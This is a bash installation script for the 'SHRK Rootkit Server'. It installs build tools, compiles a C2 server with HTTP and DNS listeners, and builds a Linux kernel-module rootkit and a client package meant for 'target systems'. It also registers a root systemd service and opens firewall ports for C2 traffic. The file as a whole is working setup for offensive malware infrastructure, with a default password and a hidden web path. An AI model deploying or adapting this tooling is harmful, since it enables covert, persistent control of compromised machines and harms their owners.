#!/bin/bash

# SHRK Rootkit Server Installation Script
# For local VPS deployment (Docker-free)

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration variables (can be overridden by environment)
SHRK_PASSWORD=${SHRK_PASSWORD:-"supersecret"}
SHRK_PATH=${SHRK_PATH:-"/no_one_here"}
SHRK_HTTP_ADDR=${SHRK_HTTP_ADDR:-"0.0.0.0:7070"}
SHRK_C2_ADDR=${SHRK_C2_ADDR:-"0.0.0.0:1053"}
SHRK_HTTP_URL=${SHRK_HTTP_URL:-""}
SHRK_C2_URL=${SHRK_C2_URL:-""}
INSTALL_SYSTEMD=${INSTALL_SYSTEMD:-"yes"}
BUILD_CLIENTS=${BUILD_CLIENTS:-"yes"}

print_banner() {
    echo -e "${RED}"
    echo "  ███████╗██╗  ██╗██████╗ ██╗  ██╗"
    echo "  ██╔════╝██║  ██║██╔══██╗██║ ██╔╝"
    echo "  ███████╗███████║██████╔╝█████╔╝ "
    echo "  ╚════██║██╔══██║██╔══██╗██╔═██╗ "
    echo "  ███████║██║  ██║██║  ██║██║  ██╗"
    echo "  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "${BLUE}SHRK Rootkit Server Installer${NC}"
    echo -e "${YELLOW}Local VPS Installation (Docker-free)${NC}"
    echo ""
}

log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "This script must be run as root"
        exit 1
    fi
}

detect_os() {
    if [[ -f /etc/os-release ]]; then
        . /etc/os-release
        OS=$ID
        OS_VERSION=$VERSION_ID
    else
        log_error "Cannot detect operating system"
        exit 1
    fi
    
    log_info "Detected OS: $OS $OS_VERSION"
}

install_dependencies() {
    log_info "Installing dependencies..."
    
    case $OS in
        ubuntu|debian)
            apt update
            apt install -y golang-go make gcc linux-headers-$(uname -r) build-essential curl
            ;;
        centos|rhel|fedora)
            if command -v dnf &> /dev/null; then
                dnf install -y golang make gcc kernel-devel kernel-headers curl
            else
                yum install -y golang make gcc kernel-devel kernel-headers curl
            fi
            ;;
        arch)
            pacman -Sy --noconfirm go make gcc linux-headers curl
            ;;
        *)
            log_error "Unsupported operating system: $OS"
            exit 1
            ;;
    esac
    
    log_success "Dependencies installed successfully"
}

check_go_version() {
    log_info "Checking Go version..."
    
    if ! command -v go &> /dev/null; then
        log_error "Go is not installed or not in PATH"
        exit 1
    fi
    
    GO_VERSION=$(go version | grep -oP 'go\K[0-9]+\.[0-9]+\.[0-9]+')
    REQUIRED_VERSION="1.23.2"
    
    if [[ "$(printf '%s\n' "$REQUIRED_VERSION" "$GO_VERSION" | sort -V | head -n1)" != "$REQUIRED_VERSION" ]]; then
        log_warning "Go version $GO_VERSION is older than required $REQUIRED_VERSION"
        log_info "Attempting to install newer Go version..."
        
        # Try to install newer Go
        if install_newer_go; then
            GO_VERSION=$(go version | grep -oP 'go\K[0-9]+\.[0-9]+\.[0-9]+')
            log_success "Updated to Go version $GO_VERSION"
        else
            log_warning "Could not upgrade Go automatically"
            log_warning "Server build may still work with Go $GO_VERSION"
        fi
    else
        log_success "Go version $GO_VERSION is compatible"
    fi
}

install_newer_go() {
    # Try to install newer Go version
    case $OS in
        ubuntu|debian)
            # Try snap first (usually has newer versions)
            if command -v snap &> /dev/null; then
                snap install go --classic &> /dev/null && return 0
            fi
            # Try adding Go PPA
            if command -v add-apt-repository &> /dev/null; then
                add-apt-repository ppa:longsleep/golang-backports -y &> /dev/null
                apt update &> /dev/null
                apt install -y golang-go &> /dev/null && return 0
            fi
            ;;
        centos|rhel|fedora)
            # Try EPEL or newer repos
            if command -v dnf &> /dev/null; then
                dnf install -y golang &> /dev/null && return 0
            fi
            ;;
    esac
    return 1
}

get_server_urls() {
    if [[ -z "$SHRK_HTTP_URL" ]]; then
        # Try to detect public IP
        PUBLIC_IP=$(curl -s ifconfig.me 2>/dev/null || curl -s ipinfo.io/ip 2>/dev/null || echo "YOUR_VPS_IP")
        SHRK_HTTP_URL="http://${PUBLIC_IP}:7070"
        log_info "Auto-detected HTTP URL: $SHRK_HTTP_URL"
    fi
    
    if [[ -z "$SHRK_C2_URL" ]]; then
        PUBLIC_IP=$(curl -s ifconfig.me 2>/dev/null || curl -s ipinfo.io/ip 2>/dev/null || echo "YOUR_VPS_IP")
        SHRK_C2_URL="dns://${PUBLIC_IP}:1053"
        log_info "Auto-detected C2 URL: $SHRK_C2_URL"
    fi
}

build_server() {
    log_info "Building SHRK server..."
    
    cd server
    make clean 2>/dev/null || true
    make
    
    if [[ ! -f "shrk_server.elf" ]]; then
        log_error "Server build failed"
        exit 1
    fi
    
    log_success "Server built successfully"
    cd ..
}

build_clients() {
    if [[ "$BUILD_CLIENTS" != "yes" ]]; then
        log_info "Skipping client builds (BUILD_CLIENTS=no)"
        return
    fi
    
    # Temporarily disable exit on error for client builds
    set +e
    
    log_info "Building kernel module..."
    cd kernel
    make clean 2>/dev/null || true
    
    # Try building kernel module with error handling
    make 2>&1 | tee /tmp/kernel_build.log
    kernel_build_result=${PIPESTATUS[0]}
    
    if [[ $kernel_build_result -eq 0 ]]; then
        log_success "Kernel module built successfully"
    else
        log_warning "Kernel module build failed"
        if grep -q "RETPOLINE\|objtool" /tmp/kernel_build.log; then
            log_warning "Build failed due to RETPOLINE/objtool issues"
            log_warning "This is common on newer kernels with security mitigations"
            log_info "Trying alternative build approach..."
            
            # Try building with different flags
            EXTRA_CFLAGS="-fno-stack-protector" make 2>/dev/null
            if [[ $? -eq 0 ]]; then
                log_success "Kernel module built with alternative flags"
            else
                log_error "Kernel module build failed completely"
                log_warning "Server will still work, but kernel module won't be available"
                log_warning "You may need to build the kernel module manually on target systems"
            fi
        else
            log_error "Kernel module build failed with unknown error"
            log_warning "Check /tmp/kernel_build.log for details"
        fi
    fi
    cd ..
    
    log_info "Building user client..."
    cd user
    make clean 2>/dev/null || true
    make
    user_build_result=$?
    
    if [[ $user_build_result -eq 0 ]]; then
        log_success "User client built successfully"
    else
        log_error "User client build failed"
        cd ..
        # Re-enable exit on error
        set -e
        return 1
    fi
    cd ..
    
    log_info "Creating release package..."
    make release 2>/dev/null
    release_result=$?
    
    if [[ $release_result -eq 0 ]]; then
        log_success "Release package created successfully"
    else
        log_warning "Release package creation failed"
        log_warning "You can create it manually with 'make release'"
    fi
    
    # Re-enable exit on error
    set -e
    
    log_success "Client build process completed"
}

create_systemd_service() {
    if [[ "$INSTALL_SYSTEMD" != "yes" ]]; then
        log_info "Skipping systemd service creation (INSTALL_SYSTEMD=no)"
        return
    fi
    
    log_info "Creating systemd service..."
    
    CURRENT_DIR=$(pwd)
    
    cat > /etc/systemd/system/shrk.service << EOF
[Unit]
Description=SHRK Rootkit Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=${CURRENT_DIR}/server
Environment=SHRK_PASSWORD=${SHRK_PASSWORD}
Environment=SHRK_PATH=${SHRK_PATH}
Environment=SHRK_HTTP_ADDR=${SHRK_HTTP_ADDR}
Environment=SHRK_C2_ADDR=${SHRK_C2_ADDR}
Environment=SHRK_HTTP_URL=${SHRK_HTTP_URL}
Environment=SHRK_C2_URL=${SHRK_C2_URL}
ExecStart=${CURRENT_DIR}/server/shrk_server.elf
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable shrk
    
    log_success "Systemd service created and enabled"
}

setup_firewall() {
    log_info "Configuring firewall rules..."
    
    # Extract port numbers from addresses
    HTTP_PORT=$(echo "$SHRK_HTTP_ADDR" | cut -d':' -f2)
    C2_PORT=$(echo "$SHRK_C2_ADDR" | cut -d':' -f2)
    
    # Try to open ports with different firewall tools
    if command -v ufw &> /dev/null; then
        ufw allow ${HTTP_PORT}/tcp
        ufw allow ${C2_PORT}/udp
        log_success "UFW rules added for ports ${HTTP_PORT}/tcp and ${C2_PORT}/udp"
    elif command -v firewall-cmd &> /dev/null; then
        firewall-cmd --permanent --add-port=${HTTP_PORT}/tcp
        firewall-cmd --permanent --add-port=${C2_PORT}/udp
        firewall-cmd --reload
        log_success "Firewalld rules added for ports ${HTTP_PORT}/tcp and ${C2_PORT}/udp"
    elif command -v iptables &> /dev/null; then
        iptables -A INPUT -p tcp --dport ${HTTP_PORT} -j ACCEPT
        iptables -A INPUT -p udp --dport ${C2_PORT} -j ACCEPT
        # Try to save iptables rules
        if command -v iptables-save &> /dev/null; then
            iptables-save > /etc/iptables/rules.v4 2>/dev/null || true
        fi
        log_success "Iptables rules added for ports ${HTTP_PORT}/tcp and ${C2_PORT}/udp"
    else
        log_warning "No firewall tool detected. Please manually open ports ${HTTP_PORT}/tcp and ${C2_PORT}/udp"
    fi
}

create_start_script() {
    log_info "Creating start script..."
    
    # Create start script directly with variables
    cat > start-shrk.sh << EOF
#!/bin/bash

# SHRK Server Start Script

export SHRK_PASSWORD="$SHRK_PASSWORD"
export SHRK_PATH="$SHRK_PATH"
export SHRK_HTTP_ADDR="$SHRK_HTTP_ADDR"
export SHRK_C2_ADDR="$SHRK_C2_ADDR"
export SHRK_HTTP_URL="$SHRK_HTTP_URL"
export SHRK_C2_URL="$SHRK_C2_URL"

cd server
./shrk_server.elf
EOF
    
    chmod +x start-shrk.sh
    
    log_success "Start script created: ./start-shrk.sh"
}

print_summary() {
    echo ""
    echo -e "${GREEN}================================${NC}"
    echo -e "${GREEN}  INSTALLATION COMPLETED!${NC}"
    echo -e "${GREEN}================================${NC}"
    echo ""
    echo -e "${BLUE}Configuration:${NC}"
    echo "  Password: $SHRK_PASSWORD"
    echo "  Web Path: $SHRK_PATH"
    echo "  HTTP URL: $SHRK_HTTP_URL"
    echo "  C2 URL: $SHRK_C2_URL"
    echo ""
    echo -e "${BLUE}Usage:${NC}"
    if [[ "$INSTALL_SYSTEMD" == "yes" ]]; then
        echo "  Start service: systemctl start shrk"
        echo "  Stop service:  systemctl stop shrk"
        echo "  View logs:     journalctl -u shrk -f"
    fi
    echo "  Manual start:  ./start-shrk.sh"
    echo ""
    echo -e "${BLUE}Access:${NC}"
    echo "  Web Interface: $SHRK_HTTP_URL$SHRK_PATH"
    echo ""
    if [[ "$BUILD_CLIENTS" == "yes" ]]; then
        echo -e "${BLUE}Client Files:${NC}"
        echo "  Release package: release/shrk-client-*.tar.gz"
        echo "  Install script:  scripts/install.sh"
    fi
    echo ""
    
    # Extract port numbers for the note
    HTTP_PORT=$(echo "$SHRK_HTTP_ADDR" | cut -d':' -f2)
    C2_PORT=$(echo "$SHRK_C2_ADDR" | cut -d':' -f2)
    echo -e "${YELLOW}Note: Make sure ports ${HTTP_PORT}/tcp and ${C2_PORT}/udp are open in your firewall${NC}"
}

main() {
    print_banner
    
    check_root
    detect_os
    install_dependencies
    check_go_version
    get_server_urls
    build_server
    build_clients
    create_systemd_service
    setup_firewall
    create_start_script
    
    print_summary
}

# Handle command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --password)
            SHRK_PASSWORD="$2"
            shift 2
            ;;
        --path)
            SHRK_PATH="$2"
            shift 2
            ;;
        --http-addr)
            SHRK_HTTP_ADDR="$2"
            shift 2
            ;;
        --c2-addr)
            SHRK_C2_ADDR="$2"
            shift 2
            ;;
        --http-url)
            SHRK_HTTP_URL="$2"
            shift 2
            ;;
        --c2-url)
            SHRK_C2_URL="$2"
            shift 2
            ;;
        --no-systemd)
            INSTALL_SYSTEMD="no"
            shift
            ;;
        --no-clients)
            BUILD_CLIENTS="no"
            shift
            ;;
        --help)
            echo "SHRK Server Installation Script"
            echo ""
            echo "Options:"
            echo "  --password PASSWORD    Set web interface password (default: supersecret)"
            echo "  --path PATH           Set web interface path (default: /no_one_here)"
            echo "  --http-addr ADDR      Set HTTP listen address (default: 0.0.0.0:7070)"
            echo "  --c2-addr ADDR        Set C2 listen address (default: 0.0.0.0:1053)"
            echo "  --http-url URL        Set HTTP URL for clients"
            echo "  --c2-url URL          Set C2 URL for clients"
            echo "  --no-systemd          Skip systemd service creation"
            echo "  --no-clients          Skip building client components"
            echo "  --help                Show this help message"
            echo ""
            echo "Environment variables can also be used:"
            echo "  SHRK_PASSWORD, SHRK_PATH, SHRK_HTTP_ADDR, SHRK_C2_ADDR"
            echo "  SHRK_HTTP_URL, SHRK_C2_URL, INSTALL_SYSTEMD, BUILD_CLIENTS"
            exit 0
            ;;
        *)
            log_error "Unknown option: $1"
            echo "Use --help for usage information"
            exit 1
            ;;
    esac
done

main
